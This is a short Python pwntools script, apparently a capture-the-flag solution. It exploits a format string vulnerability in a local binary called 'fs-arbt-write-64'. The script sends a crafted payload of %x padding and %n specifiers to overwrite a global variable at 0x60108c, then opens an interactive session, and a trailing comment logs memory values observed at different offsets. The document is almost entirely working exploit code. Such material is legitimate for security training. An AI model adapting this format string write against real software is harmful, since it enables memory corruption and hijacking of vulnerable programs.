#!/usr/bin/env python

from pwn import *

p = process("./fs-arbt-write-64")

# global random at 0x60108c

str1 = "45068"
str2 = "19138"
num1 = "9"
num2 = "10"

string = "%" + str1 + "x%" + num1 + "$n%" + str2 + "x%" + num2 + "$n"
string += "A" + p64(0x60108c) + p64(0x60108e)

p.sendline(string)
#print(p.recv())
p.interactive()

"""
for 10/11:
    0x60108c:       0xb776d6a8
    0x60108c:       0x5fa594a9
for 11/12:
    0x60108c:       0x71c23268
    0x60108c:       0xee0187bb
for 12/13:
    0x60108c:       0x4e1c0b4c
    0x60108c:       0x52671eae
for 13/14:
    0x60108c:       0x5dff2249
    0x60108c:       0x0e889a16
for 14/15:
    0x60108c:       0x1b5faa60
    0x60108c:       0xbaf8594d
for 15/16:

"""
